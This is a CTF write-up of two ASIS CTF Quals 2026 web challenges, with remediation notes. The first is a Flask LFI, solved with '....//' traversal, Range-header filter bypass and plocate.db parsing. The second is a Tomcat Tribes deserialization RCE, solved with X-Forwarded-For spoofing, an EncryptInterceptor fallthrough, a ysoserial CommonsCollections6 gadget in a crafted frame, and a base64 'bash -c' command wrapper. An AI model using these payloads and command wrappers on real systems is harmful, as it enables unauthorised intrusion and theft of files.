---
title: "ASIS CTF Quals 2026 Web Writeup: 2048 & Another Baby Web!"
slug: "asis-ctf-quals-2026-web-writeup"
description: "Complete ASIS CTF Quals 2026 Web writeup for both Web challenges. 2048 wraps an exposed Apache Tomcat cluster receiver in a distracting client-side game: reconnaissance through robots.txt leads to a diagnostics JSP that trusts X-Forwarded-For for its local-only gate; a spoofed 127.0.0.1 discloses Tomcat 9.0.116 with an unauthenticated Tribes receiver on TCP 4000, AES/CBC EncryptInterceptor, and Commons Collections 3.2.1 on the classpath. Tomcat 9.0.116 is affected by CVE-2026-34486 where EncryptInterceptor logs a decryption failure but still forwards the original plaintext message to GroupChannel, so a correctly framed ChannelData frame with SEND_OPTIONS_BYTE_MESSAGE cleared reaches XByteBuffer.deserialize and ObjectInputStream.readObject. A ysoserial CommonsCollections6 gadget wrapped in the FLT2002/TLF2003 Tribes envelope with a MemberImpl source triggers RCE as the citadel user; a bash -c brace-expansion wrapper locates the two randomly-named flag fragments in /opt/citadel/vault and /opt/citadel/gate, concatenates them into the world-writable /opt/citadel/shared, and pulls the result through the one-shot /mirror.jsp endpoint. Another Baby Web! is a Flask LFI behind three checks each with a bug: resolve() runs replace('../','') exactly once so ....// collapses to ../ after replacement and escapes the /app root; bad_data() rejects bodies containing ASIS or lib but send_file(conditional=True) honours Range so byte-windowing skips blocked substrings and passes the 64 KiB cap; the is_forbidden denylist against /etc /dev /proc /entrypoint.sh is airtight because the /app prefix makes leading double-slash impossible so those paths are red herrings. The two obvious /flag.txt and /app/flag.txt files are decoys; the real flag lives in a randomly-named directory. The Ubuntu 24.04 image ships plocate with an updatedb timer, so the plocate.db at /var/lib/plocate/plocate.db indexes the entire filesystem; the DB is pulled in 60 KiB windows, its zstd-compressed frames are decompressed with the embedded dictionary, and the 9178-path listing reveals /app/811dd3cd18605ed6761d0466f47023d4/flag.txt. Range: bytes=4- then skips the ASIS prefix past the content filter and returns the flag."
date: 2026-09-02T18:00:00Z
lastmod: 2026-09-04T14:30:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["ASIS CTF Quals 2026"]
tags:
  - "asis ctf"
  - "asis ctf quals 2026"
  - "asis ctf 2026"
  - "ctf writeup"
  - "web exploitation"
  - "web challenge"
  - "apache tomcat"
  - "tomcat cluster"
  - "tribes receiver"
  - "encryptinterceptor bypass"
  - "cve-2026-34486"
  - "java deserialization"
  - "commons collections"
  - "ysoserial"
  - "commonscollections6 gadget"
  - "xforwarded-for spoofing"
  - "diagnostics jsp"
  - "channeldata frame"
  - "memberimpl encoding"
  - "flask lfi"
  - "path traversal"
  - "single pass replace bypass"
  - "range header bypass"
  - "send_file conditional"
  - "content filter bypass"
  - "plocate database"
  - "plocate.db parse"
  - "zstd dictionary decompression"
  - "filesystem indexer leak"
  - "random directory discovery"
  - "ctf 2026"
keywords:
  - "asis ctf quals 2026 writeup"
  - "asis ctf 2026 web writeup"
  - "asis ctf 2048 writeup"
  - "asis ctf another baby web writeup"
  - "tomcat encryptinterceptor bypass ctf"
  - "cve 2026 34486 tomcat writeup"
  - "commonscollections6 tribes rce ctf"
  - "flask lfi range bypass ctf"
  - "plocate db lfi discovery ctf"
  - "asis ctf 2026 solutions"
  - "ctf web step by step 2026"
toc: true
cover:
  image: "/images/articles/asis-ctf-quals-2026-web-writeup.png"
  alt: "ASIS CTF Quals 2026 Web writeup cover — both Web challenges solved. 2048 chains a spoofable X-Forwarded-For diagnostics gate, an Apache Tomcat 9.0.116 EncryptInterceptor bypass (CVE-2026-34486) that still forwards the original plaintext ChannelData after a decryption failure, and a Commons Collections 6 gadget wrapped in a FLT2002/TLF2003 Tribes envelope with a MemberImpl source to reach ObjectInputStream.readObject on TCP port 4000 and execute a bash brace-expansion wrapper that concatenates the two randomly-named flag fragments into the world-writable /opt/citadel/shared for pickup through the one-shot /mirror.jsp endpoint. Another Baby Web! is a Flask LFI behind three checks: a one-pass replace('../','') that ....// escapes after the single strip, a bad_data() body filter that Range: bytes=4- bypasses because send_file(conditional=True) reshapes the body before inspection, and an airtight is_forbidden denylist against /etc /dev /proc /entrypoint.sh that acts as a red herring. The obvious flag.txt files are decoys; the real flag lives in a randomly-named directory that is discovered by reading /var/lib/plocate/plocate.db over the LFI in 60 KiB windows, decompressing its zstd frames with the embedded dictionary, and parsing the resulting 9178-path filesystem listing for a flag path."
---

**ASIS CTF Quals 2026**'s Web track has two challenges, and while they sit at very different difficulty levels — a `Baby`-rated Flask LFI and a full RCE chain against an Apache Tomcat cluster receiver — the two teach the same discipline: **read the checks before you read the payload**. In `Another Baby Web!` the LFI is behind three filters, one of which is a red herring, one of which is defeated by an HTTP-1.1 protocol feature, and one of which is defeated by a single-pass string replacement. In `2048` the visible 2048 game is a decoy around an unauthenticated Tribes receiver whose "encrypted" transport bypasses its own encryption on a decryption failure. Both challenges have the flag one indirection past the surface the application presents, and both have the substrate named in the source — `resolve()` in Flask, `EncryptInterceptor.messageReceived()` in Tomcat.

This walkthrough covers both challenges end-to-end, with an emphasis on the check-by-check reasoning that gets from the visible attack surface to the actual leak, and on the small pieces of tooling (`Range` byte-windowing, `bytes=0-0` existence oracles, MemberImpl-plus-FLT2002 framing, brace-expansion command wrappers) that make the exploits reliable rather than lucky.

Source repository with challenge, solvers, artifacts, and per-challenge READMEs: [Abdelkad3r/ASIS-CTF-Quals-2026](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026). See also the companion posts covering the [Misc](/ctf-writeups/asis-ctf-quals-2026-misc-writeup/) and [Crypto](/ctf-writeups/asis-ctf-quals-2026-crypto-writeup/) tracks.

## Both Web challenges at a glance

| Challenge | Difficulty | Sub-genre | Substrate the exploit reads | Flag |
|---|---|---|---|---|
| [Another Baby Web!](#another-baby-web--range-header-and-a-one-pass-replace-turn-three-filters-into-none) | Baby | Flask LFI | One-pass path filter + `Range` content filter + `plocate.db` on the target | `ASIS{Baby_w3b_cha!!3nGe_$$$}` |
| [2048](#2048--tomcat-encryptinterceptor-plaintext-fallthrough-cve-2026-34486) | Hard | Tomcat cluster RCE | Diagnostics JSP + Tribes plaintext fallthrough + Commons Collections 6 | `ASIS{t0McAT_was_Th3_KEY}` |

One warm-up + one full chain. The warm-up teaches a filter-composition lesson; the chain teaches a version-plus-classpath-plus-gadget composition lesson. Both come apart the same way — by asking what each check actually operates on.

---

## Another Baby Web! — Range header and a one-pass replace turn three filters into none

> *Flag:* `ASIS{Baby_w3b_cha!!3nGe_$$$}`
>
> *Prompt:* "Another Baby Web! Looks innocent. Probably isn't. Find the bug, grab the flag, and enjoy the aha moment."

The application is a two-route Flask app served over HTTP. `GET /` returns the app's own source (`open(__file__)` behind the scenes), and `GET /inspect?path=...` reads and returns a file from disk behind three checks. All three checks live in `resolve()`, `bad_data()`, and `is_forbidden()`; one of them is a red herring, and the other two are both bypassable.

### 1. The read primitive

```python
GENERIC_ERROR      = {"error": "Access denied or file not found"}
CHALLENGE_DIR      = "/app"
FORBIDDEN_PREFIXES = ("/etc", "/dev", "/proc", "/entrypoint.sh")
MAX_PATH_LEN       = 110
MAX_CONTENT_LENGTH = 65536

def is_forbidden(resolved):
    for prefix in FORBIDDEN_PREFIXES:
        if resolved == prefix or resolved.startswith(prefix + "/"):
            return True
    return False

def resolve(user_path):
    if not isinstance(user_path, str):           return None
    if not user_path.startswith("/"):            return None
    if len(user_path) > MAX_PATH_LEN:            return None
    if "\x00" in user_path or "\\" in user_path: return None
    cleaned  = user_path.replace("../", "")      # (!) single pass
    resolved = os.path.normpath(CHALLENGE_DIR + cleaned)
    if is_forbidden(resolved):                   return None
    return resolved

def bad_data(data):
    BLOCKED = (bytes([65, 83, 73, 83]), bytes([108, 105, 98]))   # b"ASIS", b"lib"
    return any(marker in data for marker in BLOCKED)

@app.route("/inspect")
def inspect_file():
    resolved = resolve(request.args.get("path"))
    if resolved is None or not os.path.exists(resolved) or os.path.isdir(resolved):
        return jsonify(GENERIC_ERROR), 400
    response = send_file(resolved, conditional=True)     # (!) honours Range
    response.direct_passthrough = False
    body = response.get_data()
    if bad_data(body):                 return jsonify(GENERIC_ERROR), 400   # (!) body check
    if len(body) > MAX_CONTENT_LENGTH: return jsonify(GENERIC_ERROR), 400
    return jsonify({"content": base64.b64encode(body).decode("ascii")}), 200
```

Three annotated bugs, one non-bug. Let us take them one at a time.

### 2. Bug 1 — traversal via a one-pass `replace`

`resolve()` strips `../` exactly once, then hands the string to `os.path.normpath("/app" + cleaned)`. `....//` leaves `../` behind after the single replacement:

```
"/....//x"  -> replace("../", "")  ->  "/../x"  -> normpath("/app/../x")  ->  "/x"
```

So `path=/....//<abs>` reads `/<abs>` outside the `/app` web root, while `path=/<x>` reads `/app/<x>`. Confirmed by reading `/app/requirements.txt` (`flask==3.0.3`) and, out of root, `/root/.bashrc` — which requires the `+x` bit on the `0700` `/root`, proving the app runs as **root** and can therefore read essentially anything not caught by a forbidden prefix.

### 3. Bug 2 — the content filter is a body check, so `Range` beats it

`bad_data()` inspects the returned bytes. A flag file (`ASIS{...}`) is blocked, but `send_file(..., conditional=True)` processes an HTTP `Range` header and the app re-reads the *ranged* body. Requesting `Range: bytes=4-` returns the flag without its `ASIS` prefix, which passes the filter. Three consequences we use throughout:

- **Skip blocked substrings** (`ASIS`, `lib`) by ranging around them.
- **Window past the 64 KiB `MAX_CONTENT_LENGTH` cap** by reading ≤ 60 KiB slices.
- **An exact existence oracle:** `Range: bytes=0-0` returns a single byte, which can never contain the 4-byte `ASIS` or the 3-byte `lib`, so `200 iff the file exists` regardless of its content. This removes the "not-found vs blocked-by-filter" ambiguity that plagues naive scanning.

```console
$ curl -s 'http://.../inspect?path=/flag.txt'                 -H 'Range: bytes=4-'
{"content":"e2FuMHRoZXJfRkFLM19GTEFHXzopfQo="}       # ASIS{an0ther_FAK3_FLAG_:)}
$ curl -s 'http://.../inspect?path=/....//app/flag.txt' ...   # ASIS{FAKE_FLAG_:)}
```

Both `/flag.txt` and `/app/flag.txt` are explicitly labelled *fake*.

### 4. The non-bug — `is_forbidden` is airtight

`is_forbidden` runs on the **normpath-canonical** string, and the only lexical way to open a forbidden file while dodging the check is a leading double slash (`//entrypoint.sh` — same inode, but `!= "/entrypoint.sh"`). Because `resolve()` always builds `os.path.normpath("/app" + …)`, the result always begins with a single `/`. An exhaustive offline search over the real `resolve()` confirms **zero** bypasses. `/entrypoint.sh` and `/proc/self/environ` are dead ends — deliberate red herrings designed to burn time before the plaintext files are inspected.

So the flag is a readable file at a path we must *discover*.

### 5. The "aha" — read the locate database

The two decoy flags are the only `flag.txt` files anywhere; no common flag or secret name in any common directory exists (verified with the `bytes=0-0` oracle). Reading `/var/log/dpkg.log` and `/var/log/apt/history.log` shows the box is **Ubuntu 24.04**, built 2026-08-28, with **`plocate` deliberately installed** and a `plocate-updatedb.timer` — an unusual, deliberate inclusion.

`plocate` maintains `/var/lib/plocate/plocate.db`, a full filesystem index. `updatedb` ran after the flag was placed, so the DB knows the hidden path. Read the DB, parse it, take the answer.

#### 5.1 Pulling the 333 KB binary over the LFI

The DB is larger than 64 KiB, and being binary occasionally contains the byte sequences `lib` (`6c 69 62`) and `ASIS` — mostly inside its embedded zstd dictionary, which is built from common filename substrings. Read it in ≤ 60 KiB windows and, whenever a window returns 400, recurse by halving. Single bytes cannot trip the filters, so the recursion always bottoms out on real bytes. Sizing the file first (via the `bytes=N-N` oracle) avoids reading past EOF. Total: about 176 requests.

#### 5.2 Parsing plocate.db

The header (from `plocate`'s own `db.h`) gives every field we need:

| Field | Offset | Value |
|---|---|---|
| magic | 0 | `\x00plocate` |
| num_docids | 20 | 287 |
| filename_index_offset | 32 | 61783 |
| zstd_dictionary_length | 44 | 1024 |
| zstd_dictionary_offset | 48 | 112 |

The filename index is `num_docids` little-endian `uint64` offsets, each pointing at a **zstd frame compressed with the embedded dictionary**. Decompressing every frame with `zstd -D <dict>` yields **9178** NUL-separated absolute paths — the full filesystem listing. Filtering for `flag` reveals the third, non-decoy entry:

```
/app/811dd3cd18605ed6761d0466f47023d4/flag.txt      <-- the real flag
/app/flag.txt                                        (decoy)
/flag.txt                                            (decoy)
```

### 6. Grabbing the flag

The path is under `/app`, so `/inspect` reaches it directly; `Range: bytes=4-` skips the `ASIS` prefix past `bad_data()`:

```console
$ curl -s 'http://.../inspect?path=/811dd3cd18605ed6761d0466f47023d4/flag.txt' \
        -H 'Range: bytes=4-'
{"content":"e0JhYnlfdzNiX2NoYSEhM25HZV8kJCR9"}       # {Baby_w3b_cha!!3nGe_$$$}
```

```
ASIS{Baby_w3b_cha!!3nGe_$$$}
```

### 7. Takeaways

- **String-blacklist path sanitisation is not canonicalisation.** A one-pass `replace("../", "")` is trivially defeated (`....//`); normalise with `realpath` and verify the result is *inside* the intended root.
- **Content filters live below `send_file`'s feature set.** With `conditional=True`, `Range` (and `If-Range`, `If-Modified-Since`) reshape the body *before* the app inspects it. Blacklisting bytes in the response is not access control.
- **Security by obscurity fails against a file index.** A randomly-named flag directory is worthless once `plocate`, `mlocate`, or `locate` (or `find`-able logs) can be read; do not ship an indexer that catalogues your secrets, and do not rely on unguessable paths.
- **Blocking `/proc` and `/entrypoint.sh` did nothing here** — the leak was an ordinary world-readable database. Defence must cover the whole readable filesystem, not a hand-picked denylist.

---

## 2048 — Tomcat EncryptInterceptor plaintext fallthrough (CVE-2026-34486)

> *Flag:* `ASIS{t0McAT_was_Th3_KEY}`
>
> *Prompt:* "Are you good @ 2048?"

The visible 2048 game is a distraction. The interesting attack surface is an Apache Tomcat cluster's Tribes receiver on TCP 4000 whose `EncryptInterceptor` bypasses its own encryption on a decryption failure, letting an unauthenticated plaintext `ChannelData` frame reach `ObjectInputStream.readObject()` behind it.

### 1. Reconnaissance

The landing page serves a normal client-side 2048 game. Two tempting paths present themselves and both waste time:

- The HTML contains `ASIS{lo0k_at_t41s_scr1pt_kiddi3}` in a comment — a staging-code decoy.
- The game submits a player name, score, and either `grid-lock` or `portal-gun` to `/leaderboard.jsp` — an in-memory score ledger. Winning scores do not disclose the flag.

`robots.txt` is where the actual attack surface hides:

```text
User-agent: *
Disallow: /citadel/
Disallow: /citadel/lab-notes.html
Disallow: /admin/

# garage journal got swept last cycle.
# w-w-was there another door into the intranet? like a diagnostics thing?
```

The disallowed lab notebook at `/citadel/lab-notes.html` describes the whole architecture in narrative form: a gateway on TCP 4000, `AES/CBC/PKCS5Padding` for message encryption, "failed decryption does not stop downstream processing", an "old Commons Collections library" on the classpath, two randomised flag fragments under `/opt/citadel/vault` and `/opt/citadel/gate`, files written to `/opt/citadel/shared` downloadable once via `/mirror.jsp?parcel=<label>`, and a diagnostics console gated by a proxy-header check.

### 2. The diagnostics console

`GET /diagnostics.jsp` returns HTTP 403. The console gates on client IP but takes it from `X-Forwarded-For` unconditionally, so a spoofed loopback works:

```bash
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://.../diagnostics.jsp | jq
```

Response (excerpt):

```json
{
  "server": "Apache Tomcat/9.0.116",
  "runningAs": "citadel",
  "classpathJars": [
    "catalina-ha.jar",
    "catalina-tribes.jar",
    "commons-collections-3.2.1.jar"
  ],
  "listeners": {
    "garageGateway": "tribes receiver tcp *:4000",
    "gatewayCipher": "AES/CBC/PKCS5Padding"
  }
}
```

Three pieces of load-bearing intel: **Tomcat 9.0.116** (vulnerable), **Commons Collections 3.2.1** on the classpath (gadgets available), and the **Tribes receiver on TCP 4000** speaking `AES/CBC/PKCS5Padding` (the target).

### 3. CVE-2026-34486 — plaintext fallthrough in `EncryptInterceptor`

Tomcat 9.0.116's receive path is logically:

```java
try {
    data = encryptionManager.decrypt(data);
    replaceMessage(data);
} catch (GeneralSecurityException e) {
    log.error("Failed to decrypt message", e);
}
super.messageReceived(msg);
```

The call to `super.messageReceived(msg)` sits **after** the try/catch, so if decryption fails, `msg` still holds the attacker's original plaintext and that plaintext is forwarded to the rest of the channel unchanged. 9.0.117 fixes the issue by moving the forwarding call into the successful-decryption branch.

**The encryption key is therefore unnecessary.** Sending an invalid AES ciphertext deliberately triggers the exception, and Tomcat then processes the original bytes as a plaintext frame.

### 4. Reconstructing a Tribes frame

TCP 4000 will not accept a bare Java serialization stream. The receiver expects an `XByteBuffer` transport frame containing a serialised `ChannelData` structure:

```
"FLT2002" || uint32_be(channel_data_length) || channel_data || "TLF2003"
```

The `ChannelData` body is:

```
uint32_be options
uint64_be timestamp
uint32_be unique_id_length
byte[]    unique_id
uint32_be member_length
byte[]    source_member
uint32_be message_length
byte[]    message
```

Two fields matter for the exploit path:

- **`source_member`** is itself encoded in Tomcat's `MemberImpl` format, delimited by `TRIBES-B\x01\x00` and `TRIBES-E\x01\x00` markers. Any valid member representation will pass; the wire format is fixed.
- **`options` must be zero.** If the `SEND_OPTIONS_BYTE_MESSAGE` bit (`0x0001`) is set, Tomcat wraps the body as a `ByteMessage`. With the bit clear, `GroupChannel.messageReceived()` instead calls `XByteBuffer.deserialize()` on the message body, reaching `ObjectInputStream.readObject()` — the classic Java deserialization sink.

### 5. Commons Collections 6 gadget

`commons-collections-3.2.1.jar` on the classpath makes the classic Commons Collections gadget chains available. The exploit uses ysoserial's `CommonsCollections6` payload. Download the ysoserial jar:

```bash
curl -fL \
  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar \
  -o ysoserial-all.jar
```

The remote command must avoid `Runtime.exec(String)`'s tokenisation issues. A whitespace-free `bash -c` brace-expansion wrapper is standard:

```
bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
```

The decoded script picks the two randomly-named fragment files while excluding the conspicuous `README` and `flag.txt` decoys, writes the concatenation to the world-writable `/opt/citadel/shared`, and lets the one-shot mirror endpoint hand it back:

```bash
v=$(find /opt/citadel/vault -type f ! -name README ! -name flag.txt -print -quit)
g=$(find /opt/citadel/gate  -type f -print -quit)
cat "$v" "$g" > /opt/citadel/shared/<random-label>
```

The process runs as `citadel`, which can read the root-owned fragments but cannot alter them. `/opt/citadel/shared` is world-writable and exposed by `mirror.jsp`.

### 6. End-to-end

The included exploit script performs the whole chain automatically:

1. Chooses a valid random parcel label.
2. Builds the remote fragment-recovery command.
3. Generates a Commons Collections 6 serialised object via ysoserial.
4. Wraps it in a valid Tribes `MemberImpl` and `ChannelData` frame.
5. Sends the plaintext packet to TCP 4000 (guaranteed to trip the decrypt exception and fall through to `readObject`).
6. Polls `/mirror.jsp?parcel=<label>` until the command output appears.
7. Prints the recovered flag.

Expected output:

```text
[+] generated 1562-byte CommonsCollections6 payload
[+] sent 1697-byte Tribes frame to 91.107.164.78:4000
[+] fetching one-shot parcel asis_2048_<random>
[+] recovered: ASIS{t0McAT_was_Th3_KEY}
```

### 7. Separating the flag from the decoys

Listing the protected directories after RCE showed:

```text
/opt/citadel/vault:
  README                          27 bytes   "nothing to see here, Morty."
  flag.txt                        42 bytes   "ASIS{do_you_think_rick_sanchez_is_stupid?}"
  pf_9ba6bb1b7ff5.asc             15 bytes   "ASIS{t0McAT_was"

/opt/citadel/gate:
  launch_9d56e20cffbf.conf         9 bytes   "_Th3_KEY}"
```

The obvious `flag.txt` is another decoy. The lab notes identify the *randomised* labels as the two launch-code halves; concatenating them in `vault`-then-`gate` order gives the real flag.

### 8. Flag

```
ASIS{t0McAT_was_Th3_KEY}
```

### 9. Remediation notes

The challenge combines three independent trust failures. All three are useful case studies:

- **Upgrade Tomcat past 9.0.116** so failed decryption terminates message processing. If a component's own exception handler still forwards the failing input, it is not an exception handler — it is a plaintext bypass.
- **Do not expose the Tribes receiver to untrusted networks.** Cluster membership and transport traffic should be restricted to authenticated peers on a private network. `EncryptInterceptor` is a defence-in-depth measure, not a public-Internet perimeter.
- **Accept forwarding headers only from known reverse proxies**, and derive the client address from a trusted proxy configuration rather than the raw request header. `X-Forwarded-For` from an untrusted client is a lie by default.

Removing Commons Collections 3.2.1 also removes the gadget used here, but does not make unauthenticated Java deserialization safe — the next gadget on the classpath (or an object with an unsafe `readObject`) is one library upgrade away.

### 10. Takeaways

- **A "decrypt or drop" interceptor that drops nothing is a plaintext accepter.** The class name says the wrong thing about what the code does; verify the sink.
- **Version disclosure plus classpath disclosure is the exploit blueprint.** Diagnostics that print JAR names disclose gadget chains. If diagnostics must exist, gate them behind authentication that does not read from request headers.
- **Wire-format assumptions can be brittle.** `XByteBuffer` + `MemberImpl` + `ChannelData` is a lot of framing, but it is fixed and documented in the Tomcat source. Reconstructing the frame is boring rather than hard once the source has been read.

---

## Cross-cutting notes

Both Web challenges live at the intersection of one **filter or check** and one **feature the filter does not know about**. `Another Baby Web!`'s content filter did not know about `Range`. `2048`'s `EncryptInterceptor` did not know that its "log and continue" branch reused the caller's original bytes. Every defensive control on the way in was passed by finding one HTTP/1.1 feature or one Tomcat-internal method call that the control's authors did not model.

The general defensive lesson is the one from the Misc writeup, phrased slightly differently: **when a filter operates on a derived value, the filter's guarantees stop where the derivation stops holding**. `bad_data(body)` only holds when `body` is what the caller asked for; add `Range` and it is not. `super.messageReceived(msg)` only holds the intended invariant when the try block executed cleanly; add a decryption failure and it does not. The way to build robust filters is to write down what they are filtering *for* and check that the observed input still matches that invariant at the moment the filter runs.

## Frequently asked questions

### What is ASIS CTF Quals 2026?

ASIS CTF Quals 2026 is the qualifier round for the ASIS Finals, run by the ASIS team. Jeopardy-style, five tracks (Web, Crypto, Rev, Pwn, Misc), with a small number of hard-rated challenges rather than a long tail of warm-ups. Flags use the `ASIS{...}` prefix. The full writeup compilation lives at [Abdelkad3r/ASIS-CTF-Quals-2026](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026).

### Which Web challenges are covered here?

Both. `Another Baby Web!` (Baby, Flask LFI with three composable filter bugs) and `2048` (Hard, Apache Tomcat cluster receiver RCE via CVE-2026-34486). The full source, exploit scripts, and per-challenge notes are in [Web/Another-Baby-Web](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026/tree/main/Web/Another-Baby-Web) and [Web/2048](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026/tree/main/Web/2048).

### What is the bug class in Another Baby Web!?

Three composable filter bugs behind one `/inspect?path=` LFI. `resolve()` strips `../` exactly once, so `....//` still escapes the `/app` root after the single replacement. `bad_data()` inspects the response body for `ASIS` and `lib`, but `send_file(conditional=True)` honours HTTP `Range`, so `Range: bytes=4-` returns the flag without its `ASIS` prefix. `is_forbidden()` on `/etc`, `/dev`, `/proc`, `/entrypoint.sh` is airtight against `resolve()`'s output — a deliberate red herring.

### Why is `plocate.db` the key to Another Baby Web!?

The real flag lives in a randomly-named directory (`/app/<32-hex-chars>/flag.txt`), so it cannot be brute-forced. The Ubuntu 24.04 image ships `plocate` with an `updatedb` timer that ran after the flag was placed. The database at `/var/lib/plocate/plocate.db` indexes the full filesystem; reading it over the LFI (in 60 KiB windows, since it exceeds the 64 KiB response cap) and decompressing its zstd frames with the embedded dictionary yields a 9178-path listing, and the flag path falls out of a simple `grep flag`.

### What is CVE-2026-34486?

An Apache Tomcat vulnerability affecting 9.0.116 (and earlier in the same branch) where the Tribes cluster receiver's `EncryptInterceptor` logs a decryption failure and then still forwards the original, unencrypted message to `GroupChannel`. Sending a deliberately invalid AES ciphertext causes `EncryptInterceptor` to fail and pass the attacker's plaintext straight through to `super.messageReceived(msg)`, where — with the `SEND_OPTIONS_BYTE_MESSAGE` bit cleared — the message body reaches `XByteBuffer.deserialize()` and `ObjectInputStream.readObject()`. Fixed in 9.0.117 by moving the forward call into the success branch of the try/catch.

### Why does 2048 use Commons Collections 6 specifically?

The diagnostics console disclosed `commons-collections-3.2.1.jar` on the classpath, which is the version the classic Commons Collections gadget chains target. `CommonsCollections6` is a `HashSet` wrapping a `LazyMap` that triggers a chained `InvokerTransformer` on deserialization, ending in `Runtime.exec`. Any of `CommonsCollections{1..7}` would work here; `6` is the standard choice because it avoids `AnnotationInvocationHandler` (Java 8 compatibility) and does not require a specific reflection path that later JVMs closed.

### How is the Tribes frame constructed?

Outer envelope: `"FLT2002"` + `uint32_be(channel_data_length)` + `channel_data` + `"TLF2003"`. The `ChannelData` body carries `options` (must be 0), `timestamp`, `unique_id`, `source_member` (encoded in `MemberImpl` format with `TRIBES-B\x01\x00` / `TRIBES-E\x01\x00` markers), and `message` (the serialized Java gadget). Full construction in the exploit script; the load-bearing detail is clearing the `SEND_OPTIONS_BYTE_MESSAGE` bit so the deserializer path is taken.

### How do the two real flag fragments get concatenated?

The process runs as `citadel`, which can read the root-owned fragment files but cannot alter them. The gadget's command uses `find` with `! -name README ! -name flag.txt` to skip the two decoys, then `cat`s the two randomly-named files (`pf_<hex>.asc` in `/opt/citadel/vault` and `launch_<hex>.conf` in `/opt/citadel/gate`) into the world-writable `/opt/citadel/shared/<random-label>`. `/mirror.jsp?parcel=<label>` is a one-shot download that returns the concatenation. Vault-then-gate order gives `ASIS{t0McAT_was` + `_Th3_KEY}` = `ASIS{t0McAT_was_Th3_KEY}`.

### What's the general defensive lesson from the Web track?

**A filter operates on a derived value; the filter's guarantee only holds while the derivation holds.** `bad_data(body)` protects the intended body, not the `Range`-ranged body. `EncryptInterceptor.messageReceived()` protects the decrypted message, not the original bytes that reach `super.messageReceived(msg)` after the exception path. Verifying the intended invariant at the moment the filter runs — rather than trusting the shape of the input by construction — is what makes controls robust.

### Where can I find the source and exploit scripts?

Full challenge source, exploit scripts, artifacts, and per-challenge `README.md` writeups are in [Abdelkad3r/ASIS-CTF-Quals-2026](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026). Each Web challenge has its own `challenge/`, exploit (either `solution/solve.py` or `exploit.py`), and (for `2048`) diagnostic artifacts and the CVE patch snippet.

## Closing notes

Two Web challenges, two check-composition puzzles. `Another Baby Web!` teaches the discipline of asking what each filter actually operates on before trying to defeat it, and rewards discovering that Ubuntu 24.04 ships a full filesystem index by default. `2048` teaches the same discipline at a bigger scale: a diagnostics endpoint that trusts a client-controlled header discloses a vulnerable Tomcat version and a gadget-friendly classpath, and a "log and continue" exception handler that forwards the unhandled input turns a supposedly encrypted transport into an unauthenticated RCE surface.

Full source, exploits, and formatted per-challenge writeups are at [Abdelkad3r/ASIS-CTF-Quals-2026](https://github.com/Abdelkad3r/ASIS-CTF-Quals-2026). The [Misc](/ctf-writeups/asis-ctf-quals-2026-misc-writeup/) and [Crypto](/ctf-writeups/asis-ctf-quals-2026-crypto-writeup/) writeups cover the rest of the tracks.
